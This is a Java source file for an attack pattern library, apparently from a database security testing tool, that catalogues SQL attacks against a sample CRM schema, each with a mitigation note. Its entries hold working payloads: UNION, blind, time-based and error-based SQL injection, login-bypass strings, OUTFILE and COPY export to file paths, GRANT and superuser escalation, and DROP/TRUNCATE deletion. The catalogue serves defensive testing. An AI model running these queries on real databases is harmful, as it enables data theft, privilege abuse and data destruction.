/*  Attack Pattern Library
*
*	Author(s): Jason Flood/John Clarke
*  	Licence: Apache 2
*  
*/

package library.thejasonengine.com;

import java.util.*;
import java.util.stream.Collectors;

/**
 * Singleton library that manages pre-built attack pattern templates
 */
public class AttackPatternLibrary {
    
    private static AttackPatternLibrary instance;
    private Map<String, AttackPattern> patterns = new HashMap<>();
    
    private AttackPatternLibrary() {
        initializePatterns();
    }
    
    public static synchronized AttackPatternLibrary getInstance() {
        if (instance == null) {
            instance = new AttackPatternLibrary();
        }
        return instance;
    }
    
    private void initializePatterns() {
        // SQL Injection Patterns
        addPattern(new AttackPattern(
            "sqli-union-001",
            "Union-Based SQL Injection",
            "SQL Injection",
            "Attempts to extract data using UNION SELECT statements to combine results from multiple queries",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_id = 1 UNION SELECT username, password, email, phone, NULL, NULL, NULL, NULL FROM crm.tbl_users",
                "SELECT * FROM crm.tbl_product WHERE product_id = 1 UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns"
            ),
            "SQL_INJECTION_UNION",
            "Use parameterized queries, input validation, and least privilege database accounts",
            Arrays.asList("sqli", "union", "data-extraction", "owasp-top10")
        ));
        
        addPattern(new AttackPattern(
            "sqli-blind-002",
            "Blind SQL Injection",
            "SQL Injection",
            "Boolean-based blind SQL injection that infers data by observing application behavior",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_id = 1 AND 1=1",
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_id = 1 AND 1=2",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND SUBSTRING(password,1,1) = 'a'"
            ),
            "SQL_INJECTION_BLIND",
            "Implement proper error handling, use parameterized queries, and monitor for unusual query patterns",
            Arrays.asList("sqli", "blind", "inference", "owasp-top10")
        ));
        
        addPattern(new AttackPattern(
            "sqli-time-003",
            "Time-Based SQL Injection",
            "SQL Injection",
            "Uses database sleep functions to infer data based on response time delays",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_id = 1 AND SLEEP(5)",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)",
                "SELECT * FROM crm.tbl_product; WAITFOR DELAY '00:00:05'"
            ),
            "SQL_INJECTION_TIME_BASED",
            "Use parameterized queries, implement query timeout limits, and monitor for slow queries",
            Arrays.asList("sqli", "time-based", "blind", "owasp-top10")
        ));
        
        addPattern(new AttackPattern(
            "sqli-error-004",
            "Error-Based SQL Injection",
            "SQL Injection",
            "Exploits database error messages to extract information about database structure",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)",
                "SELECT * FROM crm.tbl_users WHERE user_id = CAST('abc' AS INTEGER)",
                "SELECT * FROM crm.tbl_product WHERE product_id = 1 AND 1=CONVERT(int, (SELECT @@version))"
            ),
            "SQL_INJECTION_ERROR_BASED",
            "Disable detailed error messages in production, use parameterized queries, and implement proper exception handling",
            Arrays.asList("sqli", "error-based", "information-disclosure", "owasp-top10")
        ));
        
        // Authentication Attack Patterns
        addPattern(new AttackPattern(
            "auth-bypass-001",
            "Authentication Bypass",
            "Authentication",
            "Attempts to bypass authentication using SQL injection in login forms",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' OR '1'='1' AND password = 'anything'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin'--' AND password = 'anything'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' OR 1=1 LIMIT 1--' AND password = 'x'"
            ),
            "AUTHENTICATION_BYPASS",
            "Use parameterized queries for authentication, implement account lockout, and use multi-factor authentication",
            Arrays.asList("authentication", "bypass", "sqli", "owasp-top10")
        ));
        
        addPattern(new AttackPattern(
            "auth-brute-002",
            "Brute Force Attack",
            "Authentication",
            "Attempts multiple login combinations to guess valid credentials",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND password = 'password123'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND password = 'admin123'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND password = '123456'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin' AND password = 'qwerty'"
            ),
            "BRUTE_FORCE_ATTACK",
            "Implement rate limiting, account lockout after failed attempts, CAPTCHA, and monitor for suspicious login patterns",
            Arrays.asList("authentication", "brute-force", "password-attack")
        ));
        
        addPattern(new AttackPattern(
            "auth-stuff-003",
            "Credential Stuffing",
            "Authentication",
            "Uses known username/password combinations from data breaches",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_users WHERE username = 'john.doe@example.com' AND password = 'Password123!'",
                "SELECT * FROM crm.tbl_users WHERE username = 'admin@company.com' AND password = 'Welcome2024'",
                "SELECT * FROM crm.tbl_users WHERE username = 'user@domain.com' AND password = 'Summer2024!'"
            ),
            "CREDENTIAL_STUFFING",
            "Implement multi-factor authentication, monitor for unusual login patterns, use CAPTCHA, and enforce password complexity",
            Arrays.asList("authentication", "credential-stuffing", "password-attack")
        ));
        
        // Data Exfiltration Patterns
        addPattern(new AttackPattern(
            "exfil-mass-001",
            "Mass Data Extraction",
            "Data Exfiltration",
            "Attempts to extract large amounts of data from multiple tables",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts",
                "SELECT * FROM crm.tbl_users",
                "SELECT * FROM crm.tbl_product",
                "SELECT * FROM crm.tbl_calls",
                "SELECT * FROM crm.tbl_email_lists"
            ),
            "MASS_DATA_EXTRACTION",
            "Implement row-level security, audit all SELECT queries, limit result set sizes, and use data masking",
            Arrays.asList("exfiltration", "data-theft", "mass-extraction")
        ));
        
        addPattern(new AttackPattern(
            "exfil-sensitive-002",
            "Sensitive Data Access",
            "Data Exfiltration",
            "Targets tables containing personally identifiable information (PII)",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT username, password, email, phone FROM crm.tbl_users",
                "SELECT account_name, contact_email, contact_phone, billing_address FROM crm.tbl_crm_accounts",
                "SELECT * FROM crm.tbl_users WHERE role = 'admin'"
            ),
            "SENSITIVE_DATA_ACCESS",
            "Encrypt sensitive data at rest, implement column-level encryption, use data masking, and audit all access to PII",
            Arrays.asList("exfiltration", "pii", "sensitive-data", "gdpr")
        ));
        
        addPattern(new AttackPattern(
            "exfil-export-003",
            "Unauthorized Data Export",
            "Data Exfiltration",
            "Attempts to export data to external files or locations",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts INTO OUTFILE '/tmp/accounts.csv'",
                "SELECT * FROM crm.tbl_users INTO OUTFILE '/var/www/html/users.txt'",
                "COPY crm.tbl_crm_accounts TO '/tmp/accounts.csv' DELIMITER ',' CSV HEADER"
            ),
            "UNAUTHORIZED_DATA_EXPORT",
            "Disable file export functions, restrict file system permissions, monitor for OUTFILE/COPY commands, and use database firewalls",
            Arrays.asList("exfiltration", "file-export", "data-theft")
        ));
        
        // Privilege Escalation Patterns
        addPattern(new AttackPattern(
            "priv-esc-001",
            "Privilege Escalation",
            "Privilege Escalation",
            "Attempts to gain elevated privileges through SQL injection",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'password'",
                "UPDATE crm.tbl_users SET role = 'admin' WHERE username = 'attacker'",
                "ALTER USER attacker WITH SUPERUSER",
                "EXEC sp_addsrvrolemember 'attacker', 'sysadmin'"
            ),
            "PRIVILEGE_ESCALATION",
            "Use least privilege principle, disable dangerous SQL commands, implement role-based access control, and audit privilege changes",
            Arrays.asList("privilege-escalation", "authorization", "admin-access")
        ));
        
        addPattern(new AttackPattern(
            "priv-role-002",
            "Role Manipulation",
            "Privilege Escalation",
            "Modifies user roles to gain unauthorized access",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "UPDATE crm.tbl_users SET role = 'admin' WHERE user_id = 999",
                "UPDATE crm.tbl_users SET permissions = 'ALL' WHERE username = 'attacker'",
                "INSERT INTO crm.tbl_user_roles (user_id, role_id) VALUES (999, 1)"
            ),
            "ROLE_MANIPULATION",
            "Implement proper authorization checks, audit role changes, use database triggers to prevent unauthorized modifications",
            Arrays.asList("privilege-escalation", "role-manipulation", "authorization")
        ));
        
        // Denial of Service Patterns
        addPattern(new AttackPattern(
            "dos-resource-001",
            "Resource Exhaustion",
            "Denial of Service",
            "Executes resource-intensive queries to exhaust database resources",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts a1, crm.tbl_crm_accounts a2, crm.tbl_crm_accounts a3",
                "SELECT * FROM crm.tbl_users u1 CROSS JOIN crm.tbl_product p1 CROSS JOIN crm.tbl_calls c1",
                "SELECT COUNT(*) FROM crm.tbl_crm_accounts WHERE account_name LIKE '%a%' OR account_name LIKE '%b%' OR account_name LIKE '%c%'"
            ),
            "RESOURCE_EXHAUSTION",
            "Implement query timeout limits, use connection pooling, monitor resource usage, and implement rate limiting",
            Arrays.asList("dos", "resource-exhaustion", "performance")
        ));
        
        addPattern(new AttackPattern(
            "dos-slow-002",
            "Slow Query Attack",
            "Denial of Service",
            "Crafts intentionally slow queries to degrade database performance",
            "MEDIUM",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_crm_accounts WHERE account_name LIKE '%' ORDER BY RAND()",
                "SELECT * FROM crm.tbl_users u JOIN crm.tbl_crm_accounts a ON u.username LIKE CONCAT('%', a.account_name, '%')",
                "SELECT * FROM crm.tbl_product WHERE UPPER(product_name) = UPPER('test') AND LOWER(description) LIKE '%slow%'"
            ),
            "SLOW_QUERY_ATTACK",
            "Set query execution time limits, optimize database indexes, monitor slow query logs, and implement query complexity analysis",
            Arrays.asList("dos", "slow-query", "performance")
        ));
        
        // Compliance Testing Patterns
        addPattern(new AttackPattern(
            "comp-gdpr-001",
            "GDPR Data Access Test",
            "Compliance Testing",
            "Tests access controls for personal data under GDPR requirements",
            "MEDIUM",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT email, phone, billing_address FROM crm.tbl_crm_accounts WHERE account_id = 1",
                "SELECT username, email, phone FROM crm.tbl_users WHERE user_id = 1",
                "SELECT * FROM crm.tbl_users WHERE email LIKE '%@example.com'"
            ),
            "GDPR_DATA_ACCESS",
            "Implement data access logging, use encryption for PII, implement right to access controls, and maintain audit trails",
            Arrays.asList("compliance", "gdpr", "pii", "privacy")
        ));
        
        addPattern(new AttackPattern(
            "comp-gdpr-002",
            "GDPR Right to Deletion Test",
            "Compliance Testing",
            "Tests data deletion capabilities required by GDPR",
            "MEDIUM",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "DELETE FROM crm.tbl_users WHERE user_id = 999",
                "DELETE FROM crm.tbl_crm_accounts WHERE account_id = 999",
                "UPDATE crm.tbl_users SET email = NULL, phone = NULL WHERE user_id = 999"
            ),
            "GDPR_RIGHT_TO_DELETION",
            "Implement secure deletion procedures, maintain deletion audit logs, and ensure cascading deletes for related data",
            Arrays.asList("compliance", "gdpr", "data-deletion", "privacy")
        ));
        
        addPattern(new AttackPattern(
            "comp-pci-001",
            "PCI-DSS Card Data Access",
            "Compliance Testing",
            "Tests access controls for payment card data",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_payment_cards",
                "SELECT card_number, cvv, expiry_date FROM crm.tbl_payment_cards WHERE user_id = 1",
                "SELECT * FROM crm.tbl_transactions WHERE amount > 1000"
            ),
            "PCI_DSS_CARD_DATA_ACCESS",
            "Encrypt card data at rest and in transit, implement tokenization, restrict access to cardholder data, and maintain audit logs",
            Arrays.asList("compliance", "pci-dss", "payment-card", "financial")
        ));
        
        addPattern(new AttackPattern(
            "comp-hipaa-001",
            "HIPAA PHI Access Test",
            "Compliance Testing",
            "Tests access controls for Protected Health Information",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_patient_records",
                "SELECT patient_name, diagnosis, treatment FROM crm.tbl_patient_records WHERE patient_id = 1",
                "SELECT * FROM crm.tbl_medical_history WHERE ssn = '123-45-6789'"
            ),
            "HIPAA_PHI_ACCESS",
            "Implement role-based access control, encrypt PHI, maintain comprehensive audit logs, and use data masking",
            Arrays.asList("compliance", "hipaa", "phi", "healthcare")
        ));
        
        addPattern(new AttackPattern(
            "comp-sox-001",
            "SOX Financial Data Access",
            "Compliance Testing",
            "Tests access controls for financial data under SOX requirements",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT * FROM crm.tbl_financial_records",
                "SELECT account_number, balance, transaction_amount FROM crm.tbl_accounts WHERE account_type = 'revenue'",
                "UPDATE crm.tbl_financial_records SET amount = 999999 WHERE record_id = 1"
            ),
            "SOX_FINANCIAL_DATA_ACCESS",
            "Implement segregation of duties, maintain audit trails, use change management controls, and restrict financial data access",
            Arrays.asList("compliance", "sox", "financial", "audit")
        ));
        
        // Data Manipulation Patterns
        addPattern(new AttackPattern(
            "manip-update-001",
            "Unauthorized Data Modification",
            "Data Manipulation",
            "Attempts to modify data without proper authorization",
            "HIGH",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "UPDATE crm.tbl_crm_accounts SET account_status = 'active' WHERE account_id = 999",
                "UPDATE crm.tbl_product SET price = 0.01 WHERE product_id = 1",
                "UPDATE crm.tbl_users SET account_balance = 999999 WHERE user_id = 1"
            ),
            "UNAUTHORIZED_DATA_MODIFICATION",
            "Implement proper authorization checks, use database triggers, maintain audit logs, and use row-level security",
            Arrays.asList("data-manipulation", "unauthorized-update", "integrity")
        ));
        
        addPattern(new AttackPattern(
            "manip-delete-001",
            "Unauthorized Data Deletion",
            "Data Manipulation",
            "Attempts to delete critical data without authorization",
            "CRITICAL",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "DELETE FROM crm.tbl_crm_accounts WHERE 1=1",
                "DROP TABLE crm.tbl_users",
                "TRUNCATE TABLE crm.tbl_product"
            ),
            "UNAUTHORIZED_DATA_DELETION",
            "Implement proper authorization, use soft deletes, maintain backups, and restrict DROP/TRUNCATE permissions",
            Arrays.asList("data-manipulation", "data-deletion", "integrity")
        ));
        
        // Information Disclosure Patterns
        addPattern(new AttackPattern(
            "info-schema-001",
            "Database Schema Enumeration",
            "Information Disclosure",
            "Attempts to discover database structure and table information",
            "MEDIUM",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT table_name FROM information_schema.tables WHERE table_schema = 'crm'",
                "SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'tbl_users'",
                "SELECT * FROM information_schema.table_privileges"
            ),
            "SCHEMA_ENUMERATION",
            "Restrict access to information_schema, use database firewalls, and monitor for reconnaissance queries",
            Arrays.asList("information-disclosure", "reconnaissance", "schema-discovery")
        ));
        
        addPattern(new AttackPattern(
            "info-version-001",
            "Database Version Detection",
            "Information Disclosure",
            "Attempts to identify database version and configuration",
            "LOW",
            Arrays.asList("mysql", "postgresql", "db2", "sqlserver"),
            Arrays.asList(
                "SELECT VERSION()",
                "SELECT @@version",
                "SELECT * FROM v$version"
            ),
            "VERSION_DETECTION",
            "Disable version disclosure, use database firewalls, and monitor for version detection attempts",
            Arrays.asList("information-disclosure", "reconnaissance", "version-detection")
        ));
    }
    
    private void addPattern(AttackPattern pattern) {
        patterns.put(pattern.getId(), pattern);
    }
    
    // Library Management Methods
    
    /**
     * Get all attack patterns
     */
    public List<AttackPattern> getAllPatterns() {
        return new ArrayList<>(patterns.values());
    }
    
    /**
     * Get pattern by ID
     */
    public AttackPattern getPatternById(String id) {
        return patterns.get(id);
    }
    
    /**
     * Get patterns by category
     */
    public List<AttackPattern> getPatternsByCategory(String category) {
        return patterns.values().stream()
            .filter(p -> p.getCategory().equalsIgnoreCase(category))
            .collect(Collectors.toList());
    }
    
    /**
     * Get patterns by severity
     */
    public List<AttackPattern> getPatternsBySeverity(String severity) {
        return patterns.values().stream()
            .filter(p -> p.getSeverity().equalsIgnoreCase(severity))
            .collect(Collectors.toList());
    }
    
    /**
     * Get patterns by target database
     */
    public List<AttackPattern> getPatternsByDatabase(String database) {
        return patterns.values().stream()
            .filter(p -> p.getTargetDatabases().contains(database.toLowerCase()))
            .collect(Collectors.toList());
    }
    
    /**
     * Search patterns by query string (searches name, description, and tags)
     */
    public List<AttackPattern> searchPatterns(String query) {
        String lowerQuery = query.toLowerCase();
        return patterns.values().stream()
            .filter(p -> 
                p.getName().toLowerCase().contains(lowerQuery) ||
                p.getDescription().toLowerCase().contains(lowerQuery) ||
                p.getTags().stream().anyMatch(tag -> tag.toLowerCase().contains(lowerQuery))
            )
            .collect(Collectors.toList());
    }
    
    /**
     * Get all unique categories
     */
    public List<String> getCategories() {
        return patterns.values().stream()
            .map(AttackPattern::getCategory)
            .distinct()
            .sorted()
            .collect(Collectors.toList());
    }
    
    /**
     * Get all unique severity levels
     */
    public List<String> getSeverityLevels() {
        return patterns.values().stream()
            .map(AttackPattern::getSeverity)
            .distinct()
            .sorted()
            .collect(Collectors.toList());
    }
    
    /**
     * Get pattern count by category
     */
    public Map<String, Long> getPatternCountByCategory() {
        return patterns.values().stream()
            .collect(Collectors.groupingBy(AttackPattern::getCategory, Collectors.counting()));
    }
    
    /**
     * Get pattern count by severity
     */
    public Map<String, Long> getPatternCountBySeverity() {
        return patterns.values().stream()
            .collect(Collectors.groupingBy(AttackPattern::getSeverity, Collectors.counting()));
    }
    
    /**
     * Get total pattern count
     */
    public int getTotalPatternCount() {
        return patterns.size();
    }
}

